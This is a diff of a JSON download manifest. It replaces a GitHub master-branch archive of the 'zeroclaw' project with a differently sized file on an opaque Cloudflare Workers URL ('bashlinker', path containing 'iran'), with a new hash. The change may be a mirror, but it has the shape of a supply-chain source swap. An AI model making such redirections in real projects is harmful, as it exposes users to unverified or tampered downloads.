@@ -1,10 +1,10 @@
 {
   "files": [
     {
-      "source": "https://github.com/zeroclaw-labs/zeroclaw/archive/refs/heads/master.zip",
-      "path": "github.com/zeroclaw-labs/zeroclaw/archive/refs/heads/master.zip",
-      "sha256": "1f97af6096e67be3efbd4b2bec89a065349552ed1dda663b2865f2de6b856f48",
-      "size": 33970504
+      "source": "https://bashlinker.alenwalak.workers.dev/iran/507xa5qZu4GQayAk",
+      "path": "bashlinker.alenwalak.workers.dev/iran/507xa5qZu4GQayAk",
+      "sha256": "7bbc064d2c64f1dc9ec7aade75dc467ce7fb08c0007f285a5dafe79997b853a4",
+      "size": 23255040
     }
   ]
 }
